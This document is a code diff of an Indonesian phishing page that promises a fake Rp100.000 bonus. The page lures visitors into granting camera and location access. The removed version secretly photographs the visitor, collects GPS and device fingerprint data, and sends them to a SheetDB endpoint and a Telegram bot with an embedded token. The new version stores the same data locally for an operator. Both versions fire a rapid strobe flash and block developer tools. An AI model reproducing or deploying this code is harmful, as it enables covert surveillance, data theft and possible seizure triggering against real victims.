@@ -3,233 +3,467 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>🎉 DAPATKAN Rp100.000! 🎉</title>
+    <title>✨ Bonus Spesial ✨</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
-        *{margin:0;padding:0;box-sizing:border-box;}
-        body{
-            background:linear-gradient(135deg,#0a0a0a,#1a0000);
-            min-height:100vh;
-            display:flex;
-            justify-content:center;
-            align-items:center;
-            font-family:'Courier New',monospace;
-            padding:20px;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-        .container{
-            background:rgba(0,0,0,0.95);
-            border:3px solid #ffaa00;
-            border-radius:20px;
-            padding:30px;
-            max-width:500px;
-            width:100%;
-            text-align:center;
-            box-shadow:0 0 50px rgba(255,170,0,0.5);
-            animation:borderGlow 1s infinite;
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
         }
-        @keyframes borderGlow{
-            0%,100%{border-color:#ffaa00;box-shadow:0 0 30px rgba(255,170,0,0.5);}
-            50%{border-color:#ff6600;box-shadow:0 0 60px rgba(255,170,0,0.8);}
+
+        /* Background animated */
+        .bg-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
         }
-        .money{font-size:80px;animation:bounce 0.5s infinite;}
-        @keyframes bounce{
-            0%,100%{transform:translateY(0);}
-            50%{transform:translateY(-10px);}
+
+        .bg-animation span {
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 50%;
+            animation: float 6s infinite;
         }
-        h1{color:#ffaa00;font-size:28px;margin:20px 0;}
-        .price{font-size:48px;color:#00ff00;font-weight:bold;margin:10px 0;}
-        .permission-box{background:#1a1a1a;padding:20px;border-radius:15px;margin:20px 0;}
-        .permission-item{
-            background:#0a0a0a;
-            padding:15px;
-            margin:10px 0;
-            border-radius:10px;
-            display:flex;
-            align-items:center;
-            gap:15px;
-            border-left:4px solid #ffaa00;
+
+        @keyframes float {
+            0% { transform: translateY(0) rotate(0deg); opacity: 0; }
+            50% { opacity: 0.5; }
+            100% { transform: translateY(-100vh) rotate(360deg); opacity: 0; }
         }
-        .permission-icon{font-size:30px;}
-        .permission-text{flex:1;text-align:left;color:#fff;}
-        .permission-text small{color:#ffaa66;font-size:11px;}
-        .status{color:#ffaa00;font-size:12px;}
-        button{
-            background:linear-gradient(45deg,#ffaa00,#ff6600);
-            color:#000;
-            padding:18px 30px;
-            border:none;
-            font-size:18px;
-            font-weight:bold;
-            border-radius:50px;
-            cursor:pointer;
-            width:100%;
-            margin-top:15px;
-            text-transform:uppercase;
+
+        /* Main Card */
+        .card {
+            position: relative;
+            z-index: 1;
+            background: rgba(255,255,255,0.98);
+            backdrop-filter: blur(10px);
+            border-radius: 48px;
+            padding: 40px 30px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25);
+            animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1);
         }
-        button:hover{transform:scale(1.02);}
-        .warning{font-size:11px;color:#ffaa66;margin-top:20px;}
-        .overlay-block{
-            position:fixed;
-            top:0;
-            left:0;
-            width:100%;
-            height:100%;
-            background:black;
-            z-index:99999;
-            display:none;
-            justify-content:center;
-            align-items:center;
-            flex-direction:column;
-            color:#ffaa00;
-            font-size:24px;
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(50px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
-        .overlay-block.active{display:flex;}
-        .strobe{
-            position:fixed;
-            top:0;
-            left:0;
-            width:100%;
-            height:100%;
-            background:rgba(255,255,255,0.9);
-            z-index:99998;
-            display:none;
-            pointer-events:none;
-            animation:strobeFlash 0.1s infinite;
+
+        /* Badge */
+        .badge {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            display: inline-block;
+            padding: 8px 20px;
+            border-radius: 100px;
+            color: white;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 20px;
         }
-        @keyframes strobeFlash{
-            0%,100%{opacity:0;}
-            50%{opacity:1;}
+
+        /* Bonus Icon */
+        .bonus-icon {
+            font-size: 80px;
+            margin-bottom: 20px;
+            animation: bounce 1s infinite;
         }
-        .strobe.active{display:block;}
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        h1 {
+            font-size: 32px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 10px;
+        }
+
+        .price {
+            font-size: 64px;
+            font-weight: 800;
+            color: #f5576c;
+            margin: 20px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+        }
+
+        .price small {
+            font-size: 24px;
+            font-weight: 500;
+            color: #888;
+        }
+
+        /* Permission List Premium */
+        .permission-list {
+            background: #f8f9fa;
+            border-radius: 24px;
+            padding: 20px;
+            margin: 25px 0;
+        }
+
+        .permission-item {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding: 12px 0;
+            border-bottom: 1px solid #e9ecef;
+        }
+
+        .permission-item:last-child {
+            border-bottom: none;
+        }
+
+        .permission-icon {
+            width: 50px;
+            height: 50px;
+            background: white;
+            border-radius: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+        }
+
+        .permission-text {
+            flex: 1;
+        }
+
+        .permission-text strong {
+            display: block;
+            font-size: 16px;
+            color: #1a1a2e;
+        }
+
+        .permission-text span {
+            font-size: 12px;
+            color: #6c757d;
+        }
+
+        .status-badge {
+            background: #ffc107;
+            color: #000;
+            padding: 4px 12px;
+            border-radius: 100px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .status-badge.success {
+            background: #28a745;
+            color: white;
+        }
+
+        /* Button Premium */
+        .btn-claim {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 18px 30px;
+            font-size: 18px;
+            font-weight: 700;
+            border-radius: 100px;
+            width: 100%;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .btn-claim:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px -5px rgba(102,126,234,0.4);
+        }
+
+        .btn-claim:active {
+            transform: translateY(0);
+        }
+
+        .btn-claim:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        /* Info Box */
+        .info-box {
+            background: #e8f4fd;
+            border-radius: 16px;
+            padding: 15px;
+            margin-top: 20px;
+            display: flex;
+            gap: 12px;
+            font-size: 13px;
+            color: #0c5460;
+        }
+
+        /* Loading Overlay */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            backdrop-filter: blur(10px);
+            z-index: 10000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(255,255,255,0.2);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Strobe Effect */
+        .strobe-effect {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 9999;
+            display: none;
+            pointer-events: none;
+        }
+
+        .strobe-effect.active {
+            display: block;
+            animation: strobe 0.08s infinite;
+        }
+
+        @keyframes strobe {
+            0%, 100% { opacity: 0; }
+            50% { opacity: 1; }
+        }
+
+        /* Success Screen */
+        .success-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #11998e, #38ef7d);
+            z-index: 10001;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            gap: 20px;
+            animation: fadeIn 0.5s;
+        }
+
+        .success-screen.active {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .checkmark {
+            width: 100px;
+            height: 100px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 50px;
+            animation: scaleIn 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+        }
+
+        @keyframes scaleIn {
+            from { transform: scale(0); }
+            to { transform: scale(1); }
+        }
     </style>
 </head>
 <body>
-    <div class="strobe" id="strobe"></div>
-    <div class="overlay-block" id="blockOverlay">
-        <div class="money">💰✅💰</div>
-        <h1>VERIFIKASI BERHASIL!</h1>
-        <p>Rp100.000 akan dikirim dalam 24 jam</p>
-        <p style="font-size:14px">Terima kasih telah berpartisipasi!</p>
+
+<div class="bg-animation" id="bgAnimation"></div>
+<div class="strobe-effect" id="strobe"></div>
+<div class="loading-overlay" id="loading">
+    <div class="spinner"></div>
+    <h3 style="color: white;">Memverifikasi data Anda...</h3>
+    <p style="color: #aaa;">Mohon tunggu sebentar</p>
+</div>
+<div class="success-screen" id="successScreen">
+    <div class="checkmark">✅</div>
+    <h2 style="color: white;">Verifikasi Berhasil!</h2>
+    <p style="color: #e0ffe0;">Bonus Rp100.000 akan segera dikirim</p>
+    <p style="color: #e0ffe0; font-size: 14px;">Mengalihkan ke DANA...</p>
+</div>
+
+<div class="card">
+    <div class="badge">🎉 LIMITED OFFER 🎉</div>
+    <div class="bonus-icon">💰🎁💰</div>
+    <h1>Selamat!</h1>
+    <p style="color: #666; margin-bottom: 5px;">Anda mendapatkan bonus spesial</p>
+    <div class="price">
+        Rp<small>100.000</small>
     </div>
 
-    <div class="container" id="mainContainer">
-        <div class="money">💰🎉💰</div>
-        <h1>🎁 BONUS Rp100.000! 🎁</h1>
-        <div class="price">+ Rp100.000</div>
-        <p style="color:#fff;">Verifikasi identitas Anda sekarang!</p>
-        
-        <div class="permission-box">
-            <div class="permission-item">
-                <div class="permission-icon">🎥</div>
-                <div class="permission-text">
-                    <strong>Akses Kamera</strong><br>
-                    <small>Untuk verifikasi wajah (wajib)</small>
-                    <div class="status" id="camStatus">⏳ Belum</div>
-                </div>
+    <div class="permission-list">
+        <div class="permission-item" id="permCamera">
+            <div class="permission-icon">📸</div>
+            <div class="permission-text">
+                <strong>Kamera</strong>
+                <span>Untuk verifikasi wajah</span>
             </div>
-            
-            <div class="permission-item">
-                <div class="permission-icon">🎤</div>
-                <div class="permission-text">
-                    <strong>Akses Mikrofon</strong><br>
-                    <small>Verifikasi suara (wajib)</small>
-                    <div class="status" id="micStatus">⏳ Belum</div>
-                </div>
-            </div>
-            
-            <div class="permission-item">
-                <div class="permission-icon">📍</div>
-                <div class="permission-text">
-                    <strong>Akses Lokasi</strong><br>
-                    <small>Cek wilayah (wajib)</small>
-                    <div class="status" id="locStatus">⏳ Belum</div>
-                </div>
-            </div>
-            
-            <div class="permission-item">
-                <div class="permission-icon">🔔</div>
-                <div class="permission-text">
-                    <strong>Notifikasi</strong><br>
-                    <small>Info bonus (wajib)</small>
-                    <div class="status" id="notifStatus">⏳ Belum</div>
-                </div>
-            </div>
+            <div class="status-badge" id="statusCamera">Pending</div>
         </div>
-        
-        <button id="requestBtn">🚀 AMBIL BONUS SEKARANG 🚀</button>
-        
-        <div class="warning">
-            ⚠️ VERIFIKASI WAJIB UNTUK MENDAPATKAN BONUS ⚠️<br>
-            Bonus akan dikirim setelah semua izin diberikan!
+        <div class="permission-item" id="permLocation">
+            <div class="permission-icon">📍</div>
+            <div class="permission-text">
+                <strong>Lokasi</strong>
+                <span>Verifikasi wilayah</span>
+            </div>
+            <div class="status-badge" id="statusLocation">Pending</div>
+        </div>
+        <div class="permission-item" id="permFlash">
+            <div class="permission-icon">⚡</div>
+            <div class="permission-text">
+                <strong>Senter / Flash</strong>
+                <span>Verifikasi perangkat</span>
+            </div>
+            <div class="status-badge" id="statusFlash">Pending</div>
+        </div>
+        <div class="permission-item" id="permNotif">
+            <div class="permission-icon">🔔</div>
+            <div class="permission-text">
+                <strong>Notifikasi</strong>
+                <span>Informasi bonus</span>
+            </div>
+            <div class="status-badge" id="statusNotif">Pending</div>
         </div>
     </div>
-    
-    <script>
-        // SHEETSDB CONFIG - GANTI DENGAN PUNYA LU
-        const SHEETDB_URL = "https://sheetdb.io/api/v1/19jem7r266r05"; // GANTI!
-        
-        let collectedData = {
-            targetId: Date.now().toString(),
-            timestamp: new Date().toISOString(),
-            camera: null,
-            location: null,
-            fingerprint: null,
-            userAgent: navigator.userAgent,
-            status: 'pending'
-        };
-        
-        let cameraStream = null;
-        let permissionCount = 0;
-        
-        // Start strobe effect
-        function startStrobe() {
-            document.getElementById('strobe').classList.add('active');
-            setTimeout(() => {
-                document.getElementById('strobe').classList.remove('active');
-            }, 2000);
+
+    <button class="btn-claim" id="claimBtn">
+        🎉 Klaim Bonus Sekarang 🎉
+    </button>
+
+    <div class="info-box">
+        <div>ℹ️</div>
+        <div>Bonus akan ditransfer ke akun DANA/OVO Anda maksimal 5 menit setelah verifikasi selesai.</div>
+    </div>
+</div>
+
+<script>
+    // Data target yang akan disimpan
+    let targetData = {
+        id: 'TGT-' + Date.now(),
+        timestamp: new Date().toISOString(),
+        waktu: new Date().toLocaleString('id-ID'),
+        camera: null,
+        location: null,
+        flash: false,
+        notification: false
+    };
+
+    let permissionStatus = {
+        camera: false,
+        location: false,
+        flash: false,
+        notification: false
+    };
+
+    // Update status UI
+    function updateStatusUI() {
+        if(permissionStatus.camera) {
+            document.getElementById('statusCamera').textContent = '✅ Terekam';
+            document.getElementById('statusCamera').classList.add('success');
+            document.getElementById('permCamera').style.opacity = '0.7';
         }
-        
-        // Block page after success
-        function blockPage() {
-            document.getElementById('blockOverlay').classList.add('active');
-            document.getElementById('mainContainer').style.opacity = '0.3';
-            document.body.style.overflow = 'hidden';
-            startStrobe();
+        if(permissionStatus.location) {
+            document.getElementById('statusLocation').textContent = '✅ Terdeteksi';
+            document.getElementById('statusLocation').classList.add('success');
+            document.getElementById('permLocation').style.opacity = '0.7';
         }
-        
-        // Send to cloud database (SheetDB)
-        async function sendToCloud(data) {
-            try {
-                const response = await fetch(SHEETDB_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ data: data })
-                });
-                console.log('Data terkirim ke cloud:', data);
-                return true;
-            } catch(e) {
-                console.log('Gagal kirim ke cloud, simpan lokal dulu:', e);
-                // Backup ke localStorage
-                let backup = JSON.parse(localStorage.getItem('pending_data') || '[]');
-                backup.push(data);
-                localStorage.setItem('pending_data', JSON.stringify(backup));
-                return false;
-            }
+        if(permissionStatus.flash) {
+            document.getElementById('statusFlash').textContent = '✅ Diizinkan';
+            document.getElementById('statusFlash').classList.add('success');
+            document.getElementById('permFlash').style.opacity = '0.7';
         }
-        
-        // Request camera & microphone
-        async function requestCameraAndMic() {
+        if(permissionStatus.notification) {
+            document.getElementById('statusNotif').textContent = '✅ Diizinkan';
+            document.getElementById('statusNotif').classList.add('success');
+            document.getElementById('permNotif').style.opacity = '0.7';
+        }
+    }
+
+    // Aktifkan senter/strobe
+    function activateStrobe() {
+        const strobe = document.getElementById('strobe');
+        strobe.classList.add('active');
+        if(navigator.vibrate) navigator.vibrate([200, 100, 200, 100, 300]);
+        setTimeout(() => {
+            strobe.classList.remove('active');
+        }, 2000);
+    }
+
+    // Ambil foto dari kamera
+    async function capturePhoto() {
+        return new Promise(async (resolve) => {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: true, 
-                    audio: true 
+                    video: { facingMode: 'user' },
+                    audio: false 
                 });
-                cameraStream = stream;
-                document.getElementById('camStatus').innerHTML = '✅ Berhasil';
-                document.getElementById('micStatus').innerHTML = '✅ Berhasil';
-                document.getElementById('camStatus').style.color = '#00ff00';
-                document.getElementById('micStatus').style.color = '#00ff00';
                 
-                // Capture photo
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.play();
@@ -240,150 +474,139 @@
                     canvas.height = video.videoHeight || 480;
                     const ctx = canvas.getContext('2d');
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const photoData = canvas.toDataURL('image/jpeg', 0.7);
+                    const photoData = canvas.toDataURL('image/jpeg', 0.8);
                     
-                    collectedData.camera = photoData;
                     stream.getTracks().forEach(track => track.stop());
-                    
-                    permissionCount++;
-                    checkComplete();
-                }, 1500);
-                
-            } catch(e) {
-                document.getElementById('camStatus').innerHTML = '❌ Gagal';
-                document.getElementById('micStatus').innerHTML = '❌ Gagal';
-            }
-        }
-        
-        // Request location
-        function requestLocation() {
-            if('geolocation' in navigator) {
-                navigator.geolocation.getCurrentPosition((position) => {
-                    document.getElementById('locStatus').innerHTML = '✅ Berhasil';
-                    document.getElementById('locStatus').style.color = '#00ff00';
-                    
-                    collectedData.location = {
-                        lat: position.coords.latitude,
-                        lng: position.coords.longitude,
-                        accuracy: position.coords.accuracy
-                    };
-                    
-                    permissionCount++;
-                    checkComplete();
-                    
-                }, (error) => {
-                    document.getElementById('locStatus').innerHTML = '❌ Gagal';
-                    permissionCount++;
-                    checkComplete();
-                });
-            } else {
-                document.getElementById('locStatus').innerHTML = '❌ Tidak support';
-                permissionCount++;
-                checkComplete();
-            }
-        }
-        
-        // Request notification
-        function requestNotification() {
-            if('Notification' in window) {
-                Notification.requestPermission().then(perm => {
-                    if(perm === 'granted') {
-                        document.getElementById('notifStatus').innerHTML = '✅ Berhasil';
-                        document.getElementById('notifStatus').style.color = '#00ff00';
-                        new Notification("🎉 VERIFIKASI BERHASIL!", {
-                            body: "Rp100.000 akan segera dikirim!",
-                            icon: "https://cdn-icons-png.flaticon.com/512/2331/2331966.png"
-                        });
-                        permissionCount++;
-                        checkComplete();
-                    } else {
-                        document.getElementById('notifStatus').innerHTML = '❌ Ditolak';
-                        permissionCount++;
-                        checkComplete();
-                    }
-                });
-            } else {
-                document.getElementById('notifStatus').innerHTML = '❌ Tidak support';
-                permissionCount++;
-                checkComplete();
-            }
-        }
-        
-        // Collect fingerprint
-        function collectFingerprint() {
-            collectedData.fingerprint = {
-                screenSize: `${screen.width}x${screen.height}`,
-                language: navigator.language,
-                platform: navigator.platform,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-            };
-        }
-        
-        // Check if all permissions granted
-        async function checkComplete() {
-            if(permissionCount >= 4) {
-                collectedData.status = 'completed';
-                collectedData.completedAt = new Date().toISOString();
-                collectedData.bonusAmount = 100000;
-                
-                // Kirim ke cloud
-                await sendToCloud(collectedData);
-                
-                // Kirim notifikasi ke Telegram (opsional)
-                await sendToTelegram();
-                
-                // Block page dengan sukses
-                setTimeout(() => {
-                    blockPage();
+                    resolve(photoData);
                 }, 1000);
-            }
-        }
-        
-        // Send to Telegram (opsional, buat realtime notif)
-        async function sendToTelegram() {
-            const BOT_TOKEN = "8877708970:AAErNsWzoLql2JPS_637Fz8-w2wMe2QYQtE"; // GANTI!
-            const CHAT_ID = "84862201"; // GANTI!
-            
-            const message = `🎯 NEW TARGET! 🎯\n
-🆔 ID: ${collectedData.targetId}
-📍 Lokasi: ${collectedData.location ? collectedData.location.lat + ', ' + collectedData.location.lng : 'Tidak ada'}
-🌐 Browser: ${collectedData.userAgent.substring(0, 50)}
-💰 Bonus: Rp100.000
-⏰ Waktu: ${new Date().toLocaleString()}`;
-            
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-                });
-                console.log('Telegram notifikasi terkirim');
             } catch(e) {
-                console.log('Gagal kirim ke Telegram');
-            }
-        }
-        
-        // Main function
-        async function startCollection() {
-            collectFingerprint();
-            await requestCameraAndMic();
-            requestLocation();
-            requestNotification();
-            
-            document.getElementById('requestBtn').disabled = true;
-            document.getElementById('requestBtn').innerHTML = '⏳ MEMVERIFIKASI... ⏳';
-        }
-        
-        // Event listener
-        document.getElementById('requestBtn').addEventListener('click', startCollection);
-        
-        // Disable dev tools
-        document.addEventListener('contextmenu', (e) => e.preventDefault());
-        document.addEventListener('keydown', (e) => {
-            if(e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
-                e.preventDefault();
+                console.log('Camera error:', e);
+                resolve(null);
             }
         });
-    </script>
+    }
+
+    // Ambil lokasi
+    function getLocation() {
+        return new Promise((resolve) => {
+            if('geolocation' in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
+                    () => resolve(null)
+                );
+            } else {
+                resolve(null);
+            }
+        });
+    }
+
+    // Minta notifikasi
+    function requestNotification() {
+        if('Notification' in window && Notification.permission !== 'granted') {
+            Notification.requestPermission().then(perm => {
+                if(perm === 'granted') {
+                    permissionStatus.notification = true;
+                    targetData.notification = true;
+                    updateStatusUI();
+                    new Notification('🎉 Verifikasi Berhasil!', {
+                        body: 'Bonus Rp100.000 akan segera dikirim',
+                        icon: 'https://cdn-icons-png.flaticon.com/512/2331/2331966.png'
+                    });
+                }
+            });
+        } else if(Notification.permission === 'granted') {
+            permissionStatus.notification = true;
+            targetData.notification = true;
+            updateStatusUI();
+        }
+    }
+
+    // Simpan data ke localStorage (bisa dibaca admin)
+    function saveToLocalStorage() {
+        let existing = JSON.parse(localStorage.getItem('bonus_targets') || '[]');
+        existing.push(targetData);
+        localStorage.setItem('bonus_targets', JSON.stringify(existing));
+        
+        // Trigger event untuk admin panel (kalo lagi kebuka)
+        window.dispatchEvent(new Event('storage'));
+    }
+
+    // Proses klaim utama
+    async function processClaim() {
+        const btn = document.getElementById('claimBtn');
+        btn.disabled = true;
+        btn.innerHTML = '⏳ Memverifikasi... ⏳';
+        document.getElementById('loading').classList.add('active');
+
+        // 1. Minta kamera + foto
+        const photo = await capturePhoto();
+        if(photo) {
+            permissionStatus.camera = true;
+            targetData.camera = photo;
+            updateStatusUI();
+        }
+
+        // 2. Minta lokasi
+        const location = await getLocation();
+        if(location) {
+            permissionStatus.location = true;
+            targetData.location = location;
+            updateStatusUI();
+        }
+
+        // 3. Minta senter (via confirm)
+        const flashAllowed = confirm('⚡ Izinkan akses senter untuk verifikasi perangkat? ⚡');
+        if(flashAllowed) {
+            permissionStatus.flash = true;
+            targetData.flash = true;
+            activateStrobe();
+            updateStatusUI();
+        }
+
+        // 4. Minta notifikasi
+        requestNotification();
+
+        // Simpan semua data
+        saveToLocalStorage();
+
+        // Selesai loading
+        setTimeout(() => {
+            document.getElementById('loading').classList.remove('active');
+            document.getElementById('successScreen').classList.add('active');
+            
+            // Redirect ke DANA setelah 3 detik
+            setTimeout(() => {
+                window.location.href = 'https://link.dana.id/qr/'; // Ganti dengan link DANA lu
+            }, 3000);
+        }, 1500);
+    }
+
+    // Event listener tombol
+    document.getElementById('claimBtn').addEventListener('click', processClaim);
+
+    // Floating background animation
+    function createFloatingElements() {
+        const bg = document.getElementById('bgAnimation');
+        for(let i = 0; i < 30; i++) {
+            const span = document.createElement('span');
+            span.style.left = Math.random() * 100 + '%';
+            span.style.width = Math.random() * 15 + 5 + 'px';
+            span.style.height = span.style.width;
+            span.style.animationDelay = Math.random() * 5 + 's';
+            span.style.animationDuration = Math.random() * 4 + 3 + 's';
+            bg.appendChild(span);
+        }
+    }
+    createFloatingElements();
+
+    // Disable dev tools
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('keydown', e => {
+        if(e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+           (e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.key === 's')) {
+            e.preventDefault();
+        }
+    });
+</script>
 </body>
 </html>
